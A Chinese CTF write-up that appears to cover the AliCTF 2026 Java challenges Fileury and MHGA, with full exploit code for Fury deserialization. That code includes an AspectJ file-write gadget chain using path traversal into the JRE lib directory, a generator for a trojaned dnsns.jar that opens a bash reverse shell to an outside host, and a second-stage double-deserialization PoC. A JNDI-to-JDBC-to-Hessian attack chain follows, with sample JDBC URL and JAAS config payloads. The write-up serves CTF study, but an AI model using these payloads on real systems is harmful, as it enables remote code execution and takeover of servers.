---
title: "Alictf 2026 javaweb"
onlyTitle: true
date: 2026-3-19 21:36:14
categories:
- ctf
- WP
tags:
- CTF
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8193.jpg
---





文章预计首发先知...晚点贴

第四届阿里ctf，看下几个java题，每年的传统了

https://www.aliyunctf.com/challenges

好像是这道题全网首发Fileury二次反序列化的poc，因为其他人的解题路径不太一样，可能不屑写预期解吧hh

## fileury

好像每年都出fury？这是ali强推的序列化组件吗，老演员了

### mcp测试

临时兴起，后面还是得分析的，这里测试下Jadx mcp性能，看下能不能解决阿里这种级别

虽然没有直接给出poc，但是sink点还是有的

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260311203351566.png)

后面找链子还是不太行，看来还有机会

### 写文件加载 dnsns or jce jar

之前我说aspectjweaver：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260311204520367.png)

原来被修复的cc也能用上，打扰

先看入口，接收base64字符串去反序列化

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260311205103251.png)

先看依赖有aspectj，可惜没有其他的，比如springaop

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260311205001953.png)

ban了很多类

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260311204710982.png)

官方wp说是用com.google.api.client.util.IOUtils的deserialize方法，存在二次反序列化

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260311211146449.png)

这个思路也是很吊的，因为fury的反序列化函数是deserialize，所以想到还有deserialize也能反序列化。

用tabby找下最直接的路径，并没有发现有这个链子。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260312103745507.png)

wp说是UsingToStringOrdering的compare方法可以有数据流到达IOUtils，也没找到到达UsingToStringOrdering的链子，难道是我没加jdk源代码进去分析的原因（好像还真是没有加spring的去分析来着）？但是找了下是有HashMap的，没招了，真有二次反序列化吗

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260312110046836.png)

但是翻看了su队的wp，发现并没有ban org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap

能直接aspectjweaver写文件的！

二次反序列化暂时搁置一下，但是只有写文件，据说charsets.jar还被提前加载了，计划任务更是不考虑。

因为我们手上有附件，可以用`-verbose:class`本地运行jar包，看看加载了哪些jar

之前有分析过windows下会自动加载charsets.jar，这个有时候本地显示加载了远程也能打

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260312113313554.png)

1、没有加载dnsns.jar，可以通过反序列化`sun.net.spi.nameservice.dns.DNSNameServiceDescriptor`触发`dnsns.jar`加载

2、没有加载jce.jar，可以通过重写jar中的javax.crypto.NoSuchPaddingException类来加载

jar路径可以去spring fatjar写charsets.jar文里用字典全部遍历一遍

这里是/usr/local/openjdk-8/jre/lib/jce.jar

刚开始准备把两版都写一遍的，做完dnsns累到不行了，还是算了



### 单次反序列化poc

su poc

```java
import org.apache.commons.collections.comparators.TransformingComparator;
import org.apache.commons.collections.functors.ConstantFactory;
import org.apache.commons.collections.functors.StringValueTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.fury.Fury;
import org.apache.fury.config.Language;

import java.io.FileOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;
import java.util.PriorityQueue;

public class alictf_Fileury {

    public static void main(String[] args) throws Exception {
// Goal: Arbitrary File Write
// Chain:
// PriorityQueue.readObject() -> heapify() -> comparator.compare()
// comparator = TransformingComparator(StringValueTransformer)
// transformer.transform(TiedMapEntry) -> TiedMapEntry.toString()
// TiedMapEntry.toString() -> getValue() -> map.get(key)
// map = LazyMap(StoreableCachingMap, ConstantFactory(bytes))
// LazyMap.get(key) -> factory.create(key) -> bytes
// LazyMap.put(key, bytes) -> StoreableCachingMap.put(key, bytes) -> write bytes to file 'key'
        byte[] content = Files.readAllBytes(Paths.get("evildnsns.jar"));

        String filename = "../../../../../../../../../usr/local/openjdk-8/jre/lib/ext/dnsns.jar";
//        byte[] content = cronPayload.getBytes();

// 1. Setup StoreableCachingMap (The Inner Map)
// Ensure access to the class
        Class<?> scMapClass = Class.forName("org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap");
        Constructor<?> constructor = scMapClass.getDeclaredConstructor(String.class, int.class);
        constructor.setAccessible(true);
// folder = ".", maxEntries = 100
        Map storeableMap = (Map) constructor.newInstance(".", 100);

// 2. Setup LazyMap with ConstantFactory
        ConstantFactory factory = new ConstantFactory(content);
        Map lazyMap = LazyMap.decorate(storeableMap, factory);

// 3. Setup TiedMapEntry
        TiedMapEntry entry = new TiedMapEntry(lazyMap, filename);

// 4. Setup Comparator and Transformer
// StringValueTransformer calls String.valueOf(obj) which calls obj.toString() (if not null)
        org.apache.commons.collections.Transformer transformer = StringValueTransformer.getInstance();
        TransformingComparator comparator = new TransformingComparator(transformer);

// 5. Setup PriorityQueue
        PriorityQueue queue = new PriorityQueue(2, comparator);

        Field sizeField = PriorityQueue.class.getDeclaredField("size");
        sizeField.setAccessible(true);
        sizeField.set(queue, 2);

        Field queueField = PriorityQueue.class.getDeclaredField("queue");
        queueField.setAccessible(true);
        Object[] queueArray = new Object[2];
        queueArray[0] = entry;
        queueArray[1] = entry;
        queueField.set(queue, queueArray);

// 6. Serialize with Fury
        System.out.println("Serializing AspectJ Chain with Fury...");
        Fury fury = Fury.builder().withLanguage(Language.JAVA).requireClassRegistration(false).build();
        byte[] serializedInfo = fury.serialize(queue);

        String b64 = Base64.getEncoder().encodeToString(serializedInfo);
        FileOutputStream fos = new FileOutputStream("payload_aj.b64");
        fos.write(b64.getBytes());
        fos.close();
        System.out.println("AspectJ Payload saved to payload_aj.b64");
    }
}
```

怎么构造ascii-jar呢？直接找到本地的dnsns.jar，写个构造函数即可（好像也不用ascii-jar，之前构造charsets.jar都是直接编译就能用的，直接把dnsns.jar解压出来，然后直接改DNSNameServiceDescriptor构造函数或者静态代码块都可以）

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260313210049422.png)

也可以直接抄dnsns.jar的构造，ascii-jar登场

https://mp.weixin.qq.com/s/9e0V4bnV6fuGAfO1AKLYdw

先去git clone ascii-jar的项目，然后运行下面的代码：

```python
#!/usr/bin/env python
# autor: c0ny1
# date 2022-02-13
from __future__ import print_function

import time
import os
from compress import *

allow_bytes = []
disallowed_bytes = [38,60,39,62,34,40,41] # &<'>"()
for b in range(0,128): # ASCII
    if b in disallowed_bytes:
        continue
    allow_bytes.append(b)


if __name__ == '__main__':
    padding_char = 'U'
    raw_filename = 'DNSNameServiceDescriptor.class'
    zip_entity_filename = 'sun/net/spi/nameservice/dns/DNSNameServiceDescriptor.class'
    jar_filename = 'evildnsns.jar'
    num = 1
    while True:
        # step1 动态生成java代码并编译
        javaCode = """
package sun.net.spi.nameservice.dns;
import sun.net.spi.nameservice.*;

import java.io.IOException;

public final class DNSNameServiceDescriptor implements NameServiceDescriptor {
    private static final String paddingData = "{PADDING_DATA}";
    public DNSNameServiceDescriptor() {
        try {
            Runtime.getRuntime().exec("/bin/bash -c $@|bash 0 echo bash -i >&/dev/tcp/vpsip/port 0>&1");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public NameService createNameService() throws Exception {
        return new DNSNameService();
    }

    public String getProviderName() {
        return "sun";
    }

    public String getType() {
        return "dns";
    }
}
                """
        padding_data = padding_char * num
        javaCode = javaCode.replace("{PADDING_DATA}", padding_data)

        f = open('DNSNameServiceDescriptor.java', 'w')
        f.write(javaCode)
        f.close()
        time.sleep(0.1)

        os.system("D:/jdk-all/jdk_8u_381/bin/javac.exe -cp jasper.jar DNSNameServiceDescriptor.java")
        time.sleep(0.1)

        # step02 计算压缩之后的各个部分是否在允许的ASCII范围
        raw_data = bytearray(open(raw_filename, 'rb').read())
        compressor = ASCIICompressor(bytearray(allow_bytes))
        compressed_data = compressor.compress(raw_data)[0]
        crc = zlib.crc32(raw_data) % pow(2, 32)

        st_crc = struct.pack('<L', crc)
        st_raw_data = struct.pack('<L', len(raw_data) % pow(2, 32))
        st_compressed_data = struct.pack('<L', len(compressed_data) % pow(2, 32))
        st_cdzf = struct.pack('<L', len(compressed_data) + len(zip_entity_filename) + 0x1e)


        b_crc = isAllowBytes(st_crc, allow_bytes)
        b_raw_data = isAllowBytes(st_raw_data, allow_bytes)
        b_compressed_data = isAllowBytes(st_compressed_data, allow_bytes)
        b_cdzf = isAllowBytes(st_cdzf, allow_bytes)

        # step03 判断各个部分是否符在允许字节范围
        if b_crc and b_raw_data and b_compressed_data and b_cdzf:
            print('[+] CRC:{0} RDL:{1} CDL:{2} CDAFL:{3} Padding data: {4}*{5}'.format(b_crc, b_raw_data, b_compressed_data, b_cdzf, num, padding_char))
            # step04 保存最终ascii jar
            output = open(jar_filename, 'wb')
            output.write(wrap_jar(raw_data,compressed_data, zip_entity_filename.encode()))
            print('[+] Generate {0} success'.format(jar_filename))
            break
        else:
            print('[-] CRC:{0} RDL:{1} CDL:{2} CDAFL:{3} Padding data: {4}*{5}'.format(b_crc, b_raw_data,
                                                                                       b_compressed_data, b_cdzf, num,
                                                                                       padding_char))
        num = num + 1

```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260313214455765.png)



```java
import org.apache.fury.Fury;
import org.apache.fury.config.Language;
import java.io.FileOutputStream;
import java.lang.reflect.Constructor;
import java.util.Base64;

public class ExpDNS {
    public static void main(String[] args) throws Exception {
        System.out.println("Generating payload to load sun.net.spi.nameservice.dns.DNSNameServiceDescriptor...");

        Fury fury = Fury.builder()
            .withLanguage(Language.JAVA)
            .requireClassRegistration(false)
            .build();

        // Load the class via reflection to avoid compilation errors if access is restricted
        Class<?> clazz = Class.forName("sun.net.spi.nameservice.dns.DNSNameServiceDescriptor");
        Constructor constructor = clazz.getDeclaredConstructor();
        Object instance = constructor.newInstance();

        byte[] payload = fury.serialize(instance);
        String b64 = Base64.getEncoder().encodeToString(payload);

        try (FileOutputStream fos = new FileOutputStream("payload_dns.b64")) {
            fos.write(b64.getBytes());
        }

        System.out.println("Payload saved to payload_dns.b64");
        System.out.println("Payload Base64: " + b64);
    }
}

```

弹回shell

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260319170131796.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260319170228768.png)



### 二次反序列化

去年也是fury反序列化，并且去年分析到了Fury.deserialize有触发到compare然后触发到IoUtil.readObj二次反序列化的链子

```
Fury.deserialize ->
    CollectionSerializer.read ->
    PriorityQueue.add ->
    PropertyComparator.compare ->
    PropertyUtilsBean.invokeMethod -> getter
    
    MapProxy.invoke ->
    BeanConverter.convertInternal ->
    readObject -> PriorityQueue.readObject ->
    TemplatesImpl.getOuputProperties
```

https://godownio.github.io/2025/02/28/2025aliyun-ctf-java/

在测试的时候发现Fury->CollectionSerializer都有搜索

```
MATCH p = (start:Method)-[:CALL*1..10]->(end:Method)
WHERE start.CLASSNAME = "org.apache.fury.Fury"
AND end.CLASSNAME = "org.apache.fury.serializer.collection.CollectionSerializer"
RETURN p
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260313195135379.png)

涉及到了跨反序列化器的好像确实搜索不到，比如CollectionSerializer->java.util.PriorityQueue

```
MATCH p = (start:Method)-[:CALL*1..20]->(end:Method)
WHERE start.CLASSNAME = "org.apache.fury.serializer.collection.CollectionSerializer"
AND end.CLASSNAME = "java.util.PriorityQueue"
RETURN p
```

不管了，前半段还是一样的用：

```
Fury.deserialize ->
    CollectionSerializer.read ->
    PriorityQueue.add ->
    compare
```

需要找到达IOUtils.deserialize的链子，有且仅有AbstractMemoryDataStore.get调用了IOUtils.deserialize

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260313201355576.png)

get方法，我思前想后，toString从官方放出的hint也就知道,com.google.common.collect.UsingToStringOrdering#compare是能调用到toString的

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260313202247016.png)

那toString怎么调用到get呢？

于是我翻看了values函数，发现是循环调用get出来，那dataSource如果需要toString的话，那肯定会调用自身的get啊！

果不其然，我在DataStoreUtils.toString中找到了调用get的方法（不是调用get就会调用values，想想toString的功能设计就知道这里会有了）

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260319205138481.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260319203557188.png)

（其实我开始想到了lilctf的CodeSigner.toString->get，但是写的时候才发现只能调用List.get ）

所以我觉得链子应该是：

```
Fury.deserialize ->
    CollectionSerializer.read ->
    PriorityQueue.add ->
    UsingToStringOrdering.compare ->
    AbstractMemoryDataStore.toString->
    DataStoreUtils.toString->
    AbstractMemoryDataStore.get ->
    IOUtils.deserialize 二次反序列化打aspectJweaver
    
BadAttributeValueExpException#readObject ->
TieMapEntry#toString -> getValue ->
LazyMap.get ->
SimpleCache$StoreableCachingMap.put
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241211220438891.png)

可是su为什么这样打也行啊啊啊

```Plain
PriorityQueue.readObject()
  → heapify()
  → siftDown()
  → comparator.compare(queue[0], queue[1])
  → TransformingComparator.compare()
  → StringValueTransformer.transform(TiedMapEntry)
  → String.valueOf(TiedMapEntry)
  → TiedMapEntry.toString()
  → TiedMapEntry.getValue()
  → LazyMap.get(key)
  → factory.create()                    [ConstantFactory 返回预设的 byte[]]
  → StoreableCachingMap.put(key, value)
  → 写入文件 key，内容为 value
```

第一个问题是TransformingComparator不是在黑名单吗，噢他妈的环境是cc3.2.2，你过滤cc4的有毛用啊喂

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260313204507810.png)

第二个问题是不用IOUtils二次反序列化也能打？因为他妈的压根没有过滤aspectJweaver链子啊喂

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260313204719212.png)

无敌了，wp想考的二次反序列化形同虚设，尤其是cc3的依赖过滤cc4我是真没绷住



### 二次反序列化poc

网上好像没有这条链子的poc来着

好久没写poc了，正好练手，等下，UsingToStringOrdering->toSting是不是能和SU POC里的PriorityQueue->toString相互代替来着？两个其实用哪个触发到get都一样的

```
Fury.deserialize ->
    CollectionSerializer.read ->
    PriorityQueue.add ->
    UsingToStringOrdering.compare ->
    AbstractMemoryDataStore.toString->
    DataStoreUtils.toString->
    AbstractMemoryDataStore.get ->
    IOUtils.deserialize 二次反序列化打aspectJweaver
    
BadAttributeValueExpException#readObject ->
TieMapEntry#toString -> getValue ->
LazyMap.get ->
SimpleCache$StoreableCachingMap.put
```

注意二次反序列化二阶段就不能用org.apache.commons.collections.comparators.TransformingComparator了，因为fury是用反序列化器调用还原对象的，TransformingComparator不可序列化

```java


import com.caucho.quercus.annotation.Construct;
import com.google.api.client.util.store.AbstractMemoryDataStore;
import com.google.api.client.util.store.DataStoreUtils;
import com.google.api.client.util.store.MemoryDataStoreFactory;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.fury.Fury;
import org.apache.fury.config.Language;

import javax.management.BadAttributeValueExpException;
import javax.swing.event.EventListenerList;
import javax.swing.undo.CompoundEdit;
import javax.swing.undo.UndoManager;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.security.CodeSigner;
import java.security.cert.X509Certificate;
import java.util.*;
import sun.security.provider.certpath.X509CertPath;

import java.io.FileOutputStream;


public class alictf_Fileury {

    public static void main(String[] args) throws Exception {
//BadAttributeValueExpException#readObject ->
//TieMapEntry#toString -> getValue ->
//LazyMap.get ->
//SimpleCache$StoreableCachingMap.put
        String filename = "../../../../../../../../../usr/local/openjdk-8/jre/lib/ext/dnsns.jar";
        byte[] code = Files.readAllBytes(Paths.get("evildnsns.jar"));
        Class clazz = Class.forName("org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap");
        Constructor constructor = clazz.getDeclaredConstructor(String.class,int.class);
        constructor.setAccessible(true);
        HashMap storeableCachingMap = (HashMap) constructor.newInstance(".",1);
//        storeableCachingMap.put("writeToPathFILE",code);
        LazyMap lazy = (LazyMap) LazyMap.decorate(storeableCachingMap, new ConstantTransformer(code));
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazy, filename);
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Field field = BadAttributeValueExpException.class.getDeclaredField("val");
        field.setAccessible(true);
        field.set(badAttributeValueExpException, tiedMapEntry);

        //my add
        //        Fury.deserialize ->
        //    CollectionSerializer.read ->
        //    PriorityQueue.add ->
        //    UsingToStringOrdering.compare ->
        //    DataStoreUtils.toString->
        //    AbstractMemoryDataStore.get ->
        //    IOUtils.deserialize 二次反序列化打aspectJweaver

        // 创建工厂实例
        MemoryDataStoreFactory memoryDataStoreFactory = MemoryDataStoreFactory.getDefaultInstance();

        Class<?> memoryStoreClass = Class.forName("com.google.api.client.util.store.MemoryDataStoreFactory$MemoryDataStore");
        Constructor<?> constructor1 = memoryStoreClass.getDeclaredConstructor(
                MemoryDataStoreFactory.class,
                String.class
        );
        constructor1.setAccessible(true);

        //获取UsingToStringOrdering
        Class<?> clazz1 = Class.forName("com.google.common.collect.UsingToStringOrdering");
        Field instanceField = clazz1.getDeclaredField("INSTANCE");
        instanceField.setAccessible(true);
        Comparator ordering = (Comparator) instanceField.get(null);

        AbstractMemoryDataStore store = (AbstractMemoryDataStore) constructor1.newInstance(memoryDataStoreFactory, "my-store-id");
//        AbstractMemoryDataStore objWithoutConstructor = (AbstractMemoryDataStore) createObjWithoutConstructor(AbstractMemoryDataStore.class);
        store.set("godown", badAttributeValueExpException);

        PriorityQueue queue = new PriorityQueue(2, ordering);

        Field sizeField = PriorityQueue.class.getDeclaredField("size");
        sizeField.setAccessible(true);
        sizeField.set(queue, 2);

        Field queueField = PriorityQueue.class.getDeclaredField("queue");
        queueField.setAccessible(true);
        Object[] queueArray = new Object[2];
        queueArray[0] = store;
        queueArray[1] = store;
        queueField.set(queue, queueArray);

// 6. Serialize with Fury
        System.out.println("Serializing AspectJ Chain with Fury...");
        Fury fury = Fury.builder().withLanguage(Language.JAVA).requireClassRegistration(false).build();
        byte[] serializedInfo = fury.serialize(queue);

        String b64 = Base64.getEncoder().encodeToString(serializedInfo);
        FileOutputStream fos = new FileOutputStream("payload_aj.b64");
        fos.write(b64.getBytes());
        fos.close();
        System.out.println("AspectJ Payload saved to payload_aj.b64");

        //测试
        byte[] decoded = Base64.getDecoder().decode(b64);
        String decodedStr = new String(decoded, StandardCharsets.UTF_8);
//        Fury fury = Fury.builder().withLanguage(Language.JAVA).requireClassRegistration(false).build();
        fury.deserialize(decoded);


    }
}
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260319210502051.png)

调了一晚上，不ez /(ㄒoㄒ)/~~

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260319212655536.png)



### 后续

过了几天，想不过去为什么静态搜不出来，于是上了codeql加依赖生成数据库试一下

jadx导出源代码，然后不编译模式生成数据库：

```cmd
codeql database create db-name --language=java --source-root=./sources --build-mode=none
```

等个10多分钟，根据这篇，下一个apache的codeql规则

https://aecous.github.io/2025/03/12/Codeql%E5%85%A8%E6%96%B0%E7%89%88%E6%9C%AC%E4%BB%8E0%E5%88%B01/#%E7%9B%B4%E6%8E%A5%E8%8E%B7%E4%B8%8B%E8%BD%BD%E5%B7%B2%E7%BB%8F%E5%88%9B%E5%BB%BA%E5%A5%BD%E7%9A%84%E5%BA%93

```q
/**
 * @name UsingToStringOrdering to IOUtils.deserialize
 * @description Finds any call path from UsingToStringOrdering.compare to IOUtils.deserialize
 * @kind problem
 * @id java/gadget/usingtostringordering-call-chain
 */

import java

// 辅助谓词：判断 caller 是否可能调用了 callee（处理了多态和方法重写的情况）
predicate mayCall(Method caller, Method callee) {
  exists(MethodCall ma |
    ma.getEnclosingCallable() = caller and
    (
      ma.getMethod() = callee or
      callee.overrides*(ma.getMethod()) // 覆盖子类重写父类方法的情况
    )
  )
}

predicate reachableWithin(Method src, Method dst, int steps) {
  steps = 1 and mayCall(src, dst)
  or
  steps > 1 and
  exists(Method mid |
    mayCall(src, mid) and
    reachableWithin(mid, dst, steps - 1)
  )
}

from Method m1, Method m5, int dist
where
  // 1. UsingToStringOrdering.compare
  m1.getDeclaringType().hasName("UsingToStringOrdering") and m1.hasName("compare") and
  m5.getDeclaringType().hasName("IOUtils") and m5.hasName("deserialize") and
  dist = min(int n |
    n >= 1 and n <= 7 and
    reachableWithin(m1, m5, n)
  )
  
select m1, m5, dist, "Found call path (<=10): UsingToStringOrdering.compare -> ... -> IOUtils.deserialize"

```

跑了好久好久，最后还是没结果，我不明白啊

另外java-analyzer也没找到

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260330173034861.png)



## MHGA

Make Hessian Great Again

### mcp测试

题目提示hessian，不过依旧先mcp过一遍先

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260320141439182.png)

感觉能分析出7788了，他提到的jdk11/HessianProxyFactory/ViburDBCObjectFactory也确实被用到了

### 摘要

面对答案复现

ViburDBCPObjectFactory JNDI->

Databricks JDBC Attack->JDBC to JNDI->

HessianProxyFactory JNDI->

JavaUtils.writeBytesToFilename + System.load

为什么不直接调用HessianProxyFactory JNDI？

题目只有InitialContext.lookup，而HessianProxyFactory返回的动态Proxy对象无法调用obj.xxx()这种方法去触发invoke，所以外套

中间还有trustSerialData 绕过的姿势，不过这个绕过现在没看懂，可能是之前没写过Ldap JNDI Server的原因，分析后再看吧

### ViburDBCPObjectFactory JNDI to JDBC

首先InitialContext.loop 的JNDI找继承了ObjectFactory的类，触发方法为getObjectInstance不用多说

详细解释一下getObjectInstance怎么触发JDBC的吧，因为之前没看过Hikari的JNDI转JDBC来着

ViburDBCPObjectFactory.getObjectInstance会调用ViburDBCPDataSource.start()

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260320144017157.png)

start->doStart，doStart函数里调用了initialJdbcDriver初始化driver，然后根据driver获取connector，然后初始化ConcurrentPool

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260320154642140.png)

initialJdbcDriver可以指定Driver和jdbcurl

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260320154759156.png)

ConcurrentPool构造函数里，availableSize==0调用了addInitialObjects

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260320154909683.png)

addInitialObjects循环initialSize，调用了poolObjectFactory.create()

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260320155004972.png)

转到ConnecttionFactory.create，调用了connector.connect，完成jdbc连接

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260320155057297.png)

那怎么传入jdbcurl/username/password/driver等值呢？

ViburDBCPObjectFactory.getObjectInstance会从接收到的obj(Reference)对象中循环setProperty赋值，所以传Reference就行了

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260320155601802.png)

```java
        Reference ref = new Reference("javax.sql.DataSource", "org.vibur.dbcp.ViburDBCPObjectFactory", null);
        ref.add(new StringRefAddr("driverClassName", props.getProperty("driver")));
        ref.add(new StringRefAddr("jdbcUrl", props.getProperty("url")));
        ref.add(new StringRefAddr("username", "test"));
        ref.add(new StringRefAddr("password", "test"));

        if (props.getProperty("sql") != null) {
            ref.add(new StringRefAddr("initSQL", props.getProperty("sql")));
        }
```

这里的driver和url还要改的

> 知道这里能JNDI触发JDBC，为了方便可以AI写一个Reference封装org.vibur.dbcp.ViburDBCPObjectFactory去触发jdbc连接的代码

### databricks jdbc attack to JNDI

databricks 能通过krbJAASFile参数从本地或远程加载配置文件，再次触发JNDI注入

https://blog.pyn3rd.com/2024/12/13/Databricks-JDBC-Attack-via-JAAS/

jdbc url如下

```java
jdbc:databricks://127.0.0.1:443;AuthMech=1;KrbAuthType=1;httpPath=/;KrbHostFQDN=test;KrbServiceName=test;krbJAASFile=/tmp/jaas.conf";
```

jaas.conf如下

```java
Client {
com.sun.security.auth.module.JndiLoginModule required
    user.provider.url="ldap://127.0.0.1:1389/wr4euw"
    group.provider.url="test"
    useFirstPass=true
    serviceName="test"
    debug=true;
};
```

想看下怎么触发的，按理说这里搭个环境调试下就行了，奈何我真的懒得要命，ai依赖症犯了

我勒个豆，ai秒了

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260320203533113.png)

最后还是调试了），这是栈，只能说ai是神

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260320212622770.png)

经过乱七八糟的字段判断，会调用Kerberos的认证，那么就要获取配置文件。调用Kerberos.getSubjectViaJAASConfig获取配置文件

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260320213047880.png)

那还说啥了，根据栈里的DownloadableFetchClientFactory#createClient和HiveServer2ClientFactory#createTransport，Config还支持http/https协议读取

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260320214040297.png)

Kerberos.getSubjectViaJAASConfig会调用Configuration.getConfiguration()解析配置文件，然后调用LoginContext.login

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260320214414768.png)

经过ConfigFile的实例化后，把com.sun.security.auth.module.JndiLoginModule这种配置内容都配置进去了

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260320220024144.png)

书接上文，LoginContext.login经过一堆调用会调用到JndiLoginModule

JndiLoginModule.login会调用attemptAuthentication

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260320201430283.png)

进而触发jndi，而且这里lookup完会去调用他的search方法，而不是直接像题目一样lookup就结束了，这样就会触发Proxy.invoke，不过这里lookup的返回值强转为了DirContext才能调用

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260320201506931.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260321113527992.png)

所以可以称为：二次JNDI？

### HessianProxyFactory JNDI to Hessian反序列化

HessianProxyFactory.getObjectInstance中，从reference中读取字段赋值，type/url/user/password（这里url可以支持http等协议），然后调用create去实例化HessianProxy这个动态代理类

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260321115747750.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260321120049740.png)

HessianProxy.invoke会调用readReply，这里InputStream为Hessian2Input

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260321120309466.png)

跟进到Hessian2Input.readReply，调用了this.readObject，典型的hessian反序列化

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260321120453986.png)

>`HessianProxyFactory` 本质上是为 Hessian Web RPC 服务的，服务端暴露一个可以接收 Hessian 序列化数据的 `HessianServlet`，然后客户端就可以通过动态代理的方式与服务端的 Servlet 交互，实现 RPC 调用
>
>Ref:https://su18.org/post/hessian/#%E6%8E%A5%E5%8F%A3%E7%9A%84%E6%9A%B4%E9%9C%B2%E4%B8%8E%E8%AE%BF%E9%97%AE



另外还有一个我们最开始看到的类，BurlapProxyFactory，他的代码和HessianProxyFactory几乎一模一样，不过这里用的api.getClassLoader

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260321124808056.png)

不过这里通过loader获取类加载器，而api是javax.naming.directory.DirContext及其子类，都是jdk内的类。通过这种方式获取的类加载器都是BootStrap，没法加载第三方jar，导致报错。

### Hessian反序列化

这个超全：

https://1diot9.github.io/2026/03/06/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%95%B4%E7%90%86/

我曹，关注了1diot9，这链子图无敌了，直接偷

![JavaGadget](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/JavaGadget.png)

这里可以用两种打法

* 打法1：hessian原生链

createValue反射调用任意static方法和构造函数，因为这里没有newInstance

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260321135711533.png)

HashMap.readObject -> AbstractMap.equals -> javax.swing.UIDefaults$TextAndMnemonicHashMap.get->getFromHashtable->SwingLazyValue(only jdk8)/javax.swing.UIDefaults$ProxyLazyValue.createValue->JavaUtils.writeBytesToFilename(FileWrite)/System.load

SwingLazyValue jdk8以上没了，所以jdk11用UIDefaults$ProxyLazyValue打，写dll+load加载或者CPX都可以，反正出网

另外反射调用MethodUtil#invoke可以扩大到任意方法，进而加载字节码/Runtime/signedObject

* 打法2：

另外Hessian反序列化除了触发put，还有hashCode/equals/compareTo

HashMap.readObject -> AbstractMap.equals -> javax.swing.UIDefaults$TextAndMnemonicHashMap.get -> toString

这里还有com.databricks.client.jdbc.internal.fasterxml.jackson，也有pojoNode，所以拼上结束

POJONode.toString -> JSON.writeValueAsString ->getter

>多提一嘴，getter一般是打TemplatesImpl，不过Hessian不能反序列化transient会导致初始化TemplatesImpl报错的问题
>
